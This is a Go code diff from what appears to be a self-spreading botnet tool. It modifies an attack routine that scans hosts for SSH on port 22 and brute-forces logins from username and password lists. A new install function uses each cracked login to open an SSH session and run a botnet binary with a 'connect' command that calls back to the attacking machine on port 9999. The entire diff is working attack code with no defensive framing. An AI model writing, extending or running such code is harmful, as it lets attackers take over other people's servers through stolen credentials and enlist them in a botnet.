@@ -51,56 +51,19 @@ func (a *Attack) Run() {
 	// check if ip address has port 22 for ssh
 	for host := range hosts {
 		port := strings.Split(host, ":")[1]
-		addr := strings.Split(host, ":")[0]
-		if port == "22" && addr != localIP {
+		// addr := strings.Split(host, ":")[0]
+		if port == "22" {
 			fmt.Println("[*] starting brute force for", host)
 			a.wg.Add(1)
 			go a.bruteForce(host)
 		}
 	}
-
 	a.wg.Wait()
 }
 
-// BruteForce is
-func (a *Attack) bruteForce(host string) {
+func (a *Attack) install(c *credential) {
 	defer a.wg.Done()
-
-	usernames, err := getContent(a.UsernameFile)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	passwords, err := getContent(a.PasswordFile)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	var found = false
-	c := new(credential)
-	for _, u := range usernames {
-		found = false
-		for _, p := range passwords {
-			if err := a.login(host, u, p); err != nil {
-				continue
-			}
-			c = &credential{
-				username: u,
-				password: p,
-				host:     strings.Split(host, ":")[0],
-				port:     strings.Split(host, ":")[1],
-			}
-
-			fmt.Println("[*] we are in!")
-
-			found = true
-			break
-		}
-
-		if found {
-			break
-		}
-	}
+	fmt.Println("[*] installing botnet on", c.host)
 
 	sess, err := getSSHSession(c.host, c.username, c.password)
 	if err != nil {
@@ -153,10 +116,55 @@ func (a *Attack) bruteForce(host string) {
 		fmt.Printf("[ERROR] creating ssh session %v\n", err)
 		return
 	}
-	cmd = strings.TrimSpace(string(out)) + "/botnet/bin/botnet -target 192.168.0.2 -port 9999 connect"
+	localIP := getLocalIP()
+	cmd = strings.TrimSpace(string(out)) + "/botnet/bin/botnet -target " + localIP + " -port 9999 connect"
 	if err := a.execute(cmd, sess); err != nil {
 		fmt.Printf("[ERROR] executing botnet %v\n", err)
 		return
+	}
+}
+
+// BruteForce is
+func (a *Attack) bruteForce(host string) {
+	defer a.wg.Done()
+
+	usernames, err := getContent(a.UsernameFile)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	passwords, err := getContent(a.PasswordFile)
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	var found = false
+	c := new(credential)
+	for _, u := range usernames {
+		found = false
+		for _, p := range passwords {
+			if err := a.login(host, u, p); err != nil {
+				continue
+			}
+			c = &credential{
+				username: u,
+				password: p,
+				host:     strings.Split(host, ":")[0],
+				port:     strings.Split(host, ":")[1],
+			}
+
+			fmt.Println("[*] we are in!")
+
+			a.wg.Add(1)
+			go a.install(c)
+
+			found = true
+			break
+		}
+
+		if found {
+			break
+		}
 	}
 }
 
